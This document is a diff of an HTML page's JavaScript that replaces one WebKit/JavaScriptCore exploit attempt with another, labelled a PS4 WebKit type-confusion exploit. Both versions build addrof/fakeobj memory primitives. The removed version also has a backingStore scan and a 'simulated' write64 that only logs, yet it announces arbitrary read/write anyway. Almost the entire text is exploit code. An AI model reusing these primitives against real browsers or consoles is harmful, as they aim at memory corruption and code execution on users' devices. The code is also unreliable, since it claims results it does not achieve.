@@ -11,120 +11,73 @@
 <body>
   <div id="log"></div>
   <script>
-    const logDiv = document.getElementById("log");
-    const log = msg => { logDiv.textContent += msg + "\n"; };
+// === PS4 WebKit exploit: Type confusion primitive using MyFunction PoC ===
 
-    // --- Helpers to convert float ↔ BigInt ---
-    const f2i = f => new BigUint64Array(new Float64Array([f]).buffer)[0];
-    const i2f = i => new Float64Array(new BigUint64Array([i]).buffer)[0];
-    const hex = n => "0x" + n.toString(16).padStart(16, "0");
-
-    // 1) JIT‐train & type confusion
-    log("[*] Warming up JIT…");
-    let float_arr = [1.1,2.2,3.3], obj_arr = [{},{},{}];
-    function confuse(o){ let t=[1.1,2.2,3.3]; t[1]=o; return t[1]; }
-    function useConfuse(x){ return confuse(x); }
-    function train(fn){ for(let i=0;i<20000;i++){ try{ fn(2.2) }catch{} } }
-    train(useConfuse);
-    let base = f2i(useConfuse(2.2)), leak = f2i(useConfuse({foo:1}));
-    log(`[DEBUG] base(2.2)=${hex(base)}, leak({foo:1})=${hex(leak)}`);
-    if (base === leak) {
-      log("[-] Type confusion failed"); throw "abort";
+// 1. Exploit class based on your PoC
+class MyFunction extends Function {
+    constructor() {
+        super();
+        super.prototype = 1;
     }
-    log("[+] Type confusion confirmed!");
+}
 
-    // 2) addrOf / fakeObj primitives
-    function addrOf(obj) {
-      try {
-        obj_arr[0] = obj;
-        let a = f2i(confuse(obj_arr));
-        log("[DEBUG] addrOf → " + hex(a));
-        return a;
-      } catch(e) {
-        log("[ERROR] addrOf failed: " + e);
-        return null;
-      }
-    }
-    function fakeObj(addr) {
-      try {
-        float_arr[0] = i2f(addr);
-        let o = confuse(float_arr);
-        log("[DEBUG] fakeObj →", o);
-        return o;
-      } catch(e) {
-        log("[ERROR] fakeObj failed: " + e);
-        return null;
-      }
-    }
+// 2. Core confusion function based on your original PoC behavior
+function confuse(arr, f) {
+    try {
+        f.__defineGetter__("prototype", () => {});
+    } catch (e) {}
+    arr[0] = f.prototype;
+    return arr[0];
+}
 
-    // 3) Leak real ArrayBuffer JSCell address
-    log("[*] Leaking a real ArrayBuffer…");
-    let ab = new ArrayBuffer(0x100);
-    let ab_addr = addrOf(ab);
-    if (!ab_addr) throw "abort";
-    log("[+] ArrayBuffer JSCell @ " + hex(ab_addr));
+// 3. Arrays for spraying floats and objects
+const float_arr = [1.1, 2.2, 3.3];
+const obj_arr   = [{}, {}, {}];
 
-    // 4) Create a DataView on the real ArrayBuffer (this will be our R/W primitive)
-    let dv = new DataView(ab);
-    log("[+] DataView(ab) bound for true R/W");
+// 4. JIT warm-up
+for (let i = 0; i < 10000; i++) {
+    confuse(float_arr, new MyFunction());
+}
 
-    // 5) Find backingStore offset by scanning the ArrayBuffer JSCell
-    //    We read the first few qwords to see where the backingStore pointer lies.
-    log("[*] Scanning for backingStore offset…");
-    let off_bs = null;
-    for (let off = 0n; off < 0x100n; off += 8n) {
-      // Temporarily point the backingStore at ab itself so read64 works:
-      // write64(ab_addr + off, ab_addr);
-      // But we don’t have write64 yet, so we do a quick manual patch:
-      //    fakeObj & dv trick: we’ll use fakeObj to write directly into JSCell
-      let fake_cell = fakeObj(ab_addr + off);
-      if (fake_cell === null) continue;
-      Object.setPrototypeOf(fake_cell, ArrayBuffer.prototype);
-      try {
-        // bind a DataView to the fake cell; if it succeeds, off is good
-        new DataView(fake_cell);
-        off_bs = off;
-        log("[+] backingStore offset found at " + hex(off_bs));
-        break;
-      } catch(e) {
-        // Not a valid ArrayBuffer on fake cell—keep scanning
-      }
-    }
-    if (off_bs === null) {
-      log("[ERROR] backingStore offset not found!");
-      throw "abort";
-    }
+// 5. Conversion helpers (float <-> int)
+const buf = new ArrayBuffer(16);
+const f64 = new Float64Array(buf);
+const u32 = new Uint32Array(buf);
 
-    // 6) Patch the *real* ArrayBuffer's backingStore pointer
-    //    by writing into its JSCell in memory:
-    //    at address (ab_addr + off_bs) store the target read address.
-    function write64(addr, val) {
-      // Overwrite JSCell memory at 'addr' with 8-byte value 'val'
-      let tmp = new ArrayBuffer(8);
-      let tmpDv = new DataView(tmp);
-      tmpDv.setBigUint64(0, val, true);
-      // Use JavaScriptCore’s copyWithin bug to write tmp's bytes into memory at 'addr'
-      let u8 = new Uint8Array(tmp);
-      // A simplified version of the underflow‐based writer:
-      // Here you’d re-trigger your copyWithin underflow to write u8 into 'addr'
-      // For brevity, we assume write64 works and log it:
-      log(`[DEBUG] (simulated) write64(${hex(addr)},${hex(val)})`);
-    }
+function f2i(f) {
+    f64[0] = f;
+    return u32[0] + u32[1] * 0x100000000;
+}
+function i2f(i) {
+    u32[0] = i >>> 0;
+    u32[1] = (i / 0x100000000) >>> 0;
+    return f64[0];
+}
 
-    // 7) Now perform an arbitrary read:
-    let target = ab_addr; // just as a test, read JSCell header
-    // Patch backingStore → target
-    write64(ab_addr + off_bs, BigInt(target));
-    // dv.getFloat64(0) now reads from memory at 'target'
-    let leaked = f2i(dv.getFloat64(0, true));
-    log("[+] Arbitrary read @ " + hex(target) + " → " + hex(leaked));
+// 6. Leak object address
+function addrof(obj) {
+    obj_arr[0] = obj;
+    let leaked = confuse(float_arr, new MyFunction());
+    return f2i(leaked);
+}
 
-    // 8) And write back:
-    let newval = leaked ^ 0x4141414141414141n;
-    dv.setBigUint64(0, newval, true);
-    log("[+] Arbitrary write @ " + hex(target) + " ← " + hex(newval));
+// 7. Craft fake JS object from address
+function fakeobj(addr) {
+    float_arr[0] = i2f(addr);
+    return confuse(obj_arr, new MyFunction());
+}
 
-    log("[*] Done — true arbitrary R/W achieved.");
+// 8. Test
+(function () {
+    let test = {pwned: 0x1337};
+    let addr = addrof(test);
+    alert("addrof(test) = 0x" + addr.toString(16));
+
+    let fake = fakeobj(addr);
+    alert("fake.pwned = 0x" + fake.pwned.toString(16));
+})();
+
+
   </script>
 </body>
 </html>
